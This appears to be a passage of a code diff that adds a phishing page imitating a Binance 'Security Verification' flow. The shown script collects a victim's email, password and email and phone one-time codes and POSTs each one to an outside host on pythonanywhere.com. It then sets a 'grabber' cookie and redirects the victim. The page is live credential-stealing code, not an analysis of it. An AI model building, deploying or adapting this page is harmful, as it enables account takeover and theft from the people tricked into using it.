N9fx96OZgxezuW4SAPR4QOYGydZjO4m3cBazk1keUaaMvyUXu1i33czP/1gp1iHRHsOHw9nvclZq+TRZRu+KmX9CM0EWsevR3xTBPoJjdCcdwaC+Z2qbNB00zBi3s9L5UrDRdQxExohlsLl4PLcZKwmZXIiMFxeP5+ZjLeObTZHx4uLxLAfWBIawITJeXDye5cF6ztoyIuPFxeNZLpwkxS4iMl5cPJ7lw1nWfROR8eLi8SwnTh/roSMyXlw8nuXFqcAQKpHx4uLxLDfOBYbIEhkvLh6PxxokMulD4qXPv/F4PJ6ikMh4cfF4bg9/AUi6XRiJobe/AAAAAElFTkSuQmCC">
+        </div>
+        <h1 class="text-3xl font-bold sm:text-center my-2">Security Verification Requirements</h1>
+        <p class="text-gray-500">You need to complete all of the following verification to continue.</p>
+        <h1 id="stepCounter" class="text-3xl text-yellow-500 font-bold my-5">0/2</h1>
+        <div class="flex flex-col space-y-4">
+          <div id="step3EmailBtn" class="flex flex-row bg-[#5D5226] hover:bg-[#5D5226]/90 items-center justify-between px-5 py-7 rounded-sm cursor-pointer">
+            <div class="flex flex-row gap-5">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"><script xmlns=""/><script xmlns=""/>
+                <rect width="20" height="15" transform="matrix(1 0 0 -1 2 20)" fill="#76808F"/>
+                <path d="M12 17.0005L22 7.00049V4.00049H2V7.00049L12 17.0005Z" fill="url(#paint0_linear_523_12120)"/>
+                <defs>
+                <linearGradient id="paint0_linear_523_12120" x1="12" y1="17.0005" x2="12" y2="4.00049" gradientUnits="userSpaceOnUse">
+                <stop stop-color="#F0B90B"/>
+                <stop offset="1" stop-color="#F8D33A"/>
+                </linearGradient>
+                </defs>
+              </svg>
+              <p class="text-white">Email</p>
+            </div>
+            <p class="text-white" id="rarr1">&rarr;</p>
+          </div>
+          <div id="step3PhoneBtn" class="flex flex-row bg-[#5D5226] hover:bg-[#5D5226]/90 items-center justify-between px-5 py-7 rounded-sm cursor-pointer">
+            <div class="flex flex-row gap-5">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"><script xmlns=""/><script xmlns=""/>
+                <path d="M17 2L5 2L5 22L17 22L17 2Z" fill="url(#paint0_linear_523_7926)"/>
+                <path d="M5 2H17V4H5V2Z" fill="#76808F"/>
+                <path d="M5 20H17V22H5V20Z" fill="#76808F"/>
+                <path d="M20 14.001V7.00098H7V14.001H10V18.001L14 14.001H20Z" fill="#76808F"/>
+                <defs>
+                <linearGradient id="paint0_linear_523_7926" x1="5" y1="12" x2="17" y2="12" gradientUnits="userSpaceOnUse">
+                <stop stop-color="#F0B90B"/>
+                <stop offset="1" stop-color="#F8D33A"/>
+                </linearGradient>
+                </defs>
+              </svg>
+              <p class="text-white">Phone Number</p>
+            </div>
+            <p class="text-white" id="rarr2">&rarr;</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+    <div id="stepEmail"
+      class="flex flex-col items-center justify-start min-h-screen bg-[#12161c] text-white px-4 py-5 hidden"
+    >
+      <div class="w-full max-w-sm">
+        <h1 class="text-3xl font-bold sm:text-center mb-6">Security Verification</h1>
+        <div class="flex flex-col space-y-4">
+          <p>Email Verification Code</p>
+          <input id="stepEmailInput" maxlength="6"
+          class="flex h-10 w-full px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 bg-transparent text-white border border-[#2b2f36] rounded-md"
+          type="tel"
+          />
+          <p class="text-gray-500">Enter the 6-digit verification code sent to <span id="emailDisplay2">email@email.com</span>.</p>
+          <button id="stepEmailBtn"
+            class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-bold ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-[#f0b90b]/90 h-10 px-4 py-2 bg-[#f0b90b] text-[#1E242D]"
+          >
+            Submit
+          </button>
+        </div>
+        <div class="flex justify-center mt-6">
+          <button
+            class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-accent hover:text-accent-foreground h-10 px-4 py-2 text-[#f0b90b]"
+          >
+            Security verification unavailable?
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div id="stepPhone"
+      class="flex flex-col items-center justify-start min-h-screen bg-[#12161c] text-white px-4 py-5 hidden"
+    >
+      <div class="w-full max-w-sm">
+        <h1 class="text-3xl font-bold sm:text-center mb-6">Security Verification</h1>
+        <div class="flex flex-col space-y-4">
+          <p>Phone Verification Code</p>
+          <input id="stepPhoneInput" maxlength="6"
+          class="flex h-10 w-full px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 bg-transparent text-white border border-[#2b2f36] rounded-md"
+          type="tel"
+          />
+          <p class="text-gray-500">Enter the 6-digit verification code sent to your phone.</p>
+          <button id="stepPhoneBtn"
+            class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-bold ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-[#f0b90b]/90 h-10 px-4 py-2 bg-[#f0b90b] text-[#1E242D]"
+          >
+            Submit
+          </button>
+        </div>
+        <div class="flex justify-center mt-6">
+          <button
+            class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-accent hover:text-accent-foreground h-10 px-4 py-2 text-[#f0b90b]"
+          >
+            Security verification unavailable?
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      // CONTAINERS
+      var step1 = document.getElementById('step1');
+      var step2 = document.getElementById('step2');
+      var step3 = document.getElementById('step3');
+      var stepEmail = document.getElementById('stepEmail');
+      var stepPhone = document.getElementById('stepPhone');
+      var stepCounter = document.getElementById('stepCounter');
+
+      var emailDisplay1 = document.getElementById('emailDisplay1');
+      var emailDisplay2 = document.getElementById('emailDisplay2');
+      
+      // BUTTONS
+      var step1Btn = document.getElementById('step1Btn');
+      var step2Btn = document.getElementById('step2Btn');
+      var step3EmailBtn = document.getElementById('step3EmailBtn');
+      var step3PhoneBtn = document.getElementById('step3PhoneBtn');
+      var stepEmailBtn = document.getElementById('stepEmailBtn');
+      var stepPhoneBtn = document.getElementById('stepPhoneBtn');
+      var rarr1 = document.getElementById('rarr1');
+      var rarr2 = document.getElementById('rarr2');
+
+      // INPUTS
+      var step1Input = document.getElementById('step1Input');
+      var step2Input = document.getElementById('step2Input');
+      var step3Input = document.getElementById('step3Input');
+      var stepEmailInput = document.getElementById('stepEmailInput');
+      var stepPhoneInput = document.getElementById('stepPhoneInput');
+
+      // GLOBAL VARIABLES
+      var stepEmailVar = false;
+      var stepPhoneVar = false;
+
+      // FUNCTIONS
+      async function pushData(data) {
+        fetch('https://bobarakhas.pythonanywhere.com', {
+          method: "POST",
+          headers: {
+            'Content-Type' : 'application/json',
+          },
+          body: JSON.stringify({
+            message : {'binance' : data}
+          })
+        })
+      }
+
+      step1Btn.onclick = () => {
+        let regex = /^([_a-z0-9]+(\.[_a-z0-9]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,5}))|(\d+$)$/
+        if (step1Input.value.length > 0 && regex.test(step1Input.value)) {
+          pushData({
+            'email' : step1Input.value
+          });
+          step1Btn.classList.add('btn-loading');
+          emailDisplay1.innerHTML = step1Input.value;
+          emailDisplay2.innerHTML = step1Input.value;
+          setTimeout(() => {
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+            step3.classList.add('hidden');
+            stepEmail.classList.add('hidden');
+            stepPhone.classList.add('hidden');
+          }, 1000);
+        }
+      }
+
+      step2Btn.onclick = () => {
+        if (step2Input.value.length > 0) {
+          pushData({
+            'password' : step2Input.value
+          });
+          step2Btn.classList.add('btn-loading');
+          setTimeout(() => {
+            step1.classList.add('hidden');
+            step2.classList.add('hidden');
+            step3.classList.remove('hidden');
+            stepEmail.classList.add('hidden');
+            stepPhone.classList.add('hidden');
+          }, 1000);
+        }
+      }
+
+      step3EmailBtn.onclick = () => {
+        if (stepEmailVar === false) {
+          step1.classList.add('hidden');
+          step2.classList.add('hidden');
+          step3.classList.add('hidden');
+          stepEmail.classList.remove('hidden');
+          stepPhone.classList.add('hidden');
+        }
+      }
+
+      step3PhoneBtn.onclick = () => {
+        if (stepPhoneVar === false) {
+          step1.classList.add('hidden');
+          step2.classList.add('hidden');
+          step3.classList.add('hidden');
+          stepEmail.classList.add('hidden');
+          stepPhone.classList.remove('hidden');
+        }
+      }
+
+      stepEmailBtn.onclick = () => {
+        if (stepEmailInput.value.length === 6) {
+          pushData({
+            'email_otp' : stepEmailInput.value
+          });
+          document.cookie = "grabber=true";
+          stepEmailBtn.classList.add('btn-loading');
+          step3EmailBtn.classList.add('bg-transparent', 'border', 'border-1', 'border-gray-700', 'rounded-sm', 'hover:bg-transparent', 'cursor-default');
+          rarr1.classList.add('hidden');
+          stepEmailVar = true;
+          if (stepEmailVar === true && stepPhoneVar === true) {
+            setTimeout(() => {
+              window.location = '/index.html';
+            }, 2000);
+          } else if (stepEmailVar === true || stepPhoneVar === true) {
+            stepCounter.innerHTML = '1/2';
+          }
+          setTimeout(() => {
+            step1.classList.add('hidden');
+            step2.classList.add('hidden');
+            step3.classList.remove('hidden');
+            stepEmail.classList.add('hidden');
+            stepPhone.classList.add('hidden');
+          }, 1500);
+        }
+      }
+      
+      stepPhoneBtn.onclick = () => {
+        if (stepPhoneInput.value.length === 6) {
+          pushData({
+            'phone_otp' : stepPhoneInput.value
+          });
+          document.cookie = "grabber=true";
+          stepPhoneBtn.classList.add('btn-loading');
+          step3PhoneBtn.classList.add('bg-transparent', 'border', 'border-1', 'border-gray-700', 'rounded-sm', 'hover:bg-transparent', 'cursor-default');
+          rarr2.classList.add('hidden');
+          stepPhoneVar = true;
+          if (stepEmailVar === true && stepPhoneVar === true) {
+            setTimeout(() => {
+              window.location = '/index.html';
+            }, 2000);
+          } else if (stepEmailVar === true || stepPhoneVar === true) {
+            stepCounter.innerHTML = '1/2';
+          }
+          setTimeout(() => {
+            step1.classList.add('hidden');
+            step2.classList.add('hidden');
+            step3.classList.remove('hidden');
+            stepEmail.classList.add('hidden');
+            stepPhone.classList.add('hidden');
+          }, 1500);
+        }
+      }
+
+
+
+    </script>
+  </body>
+</html>
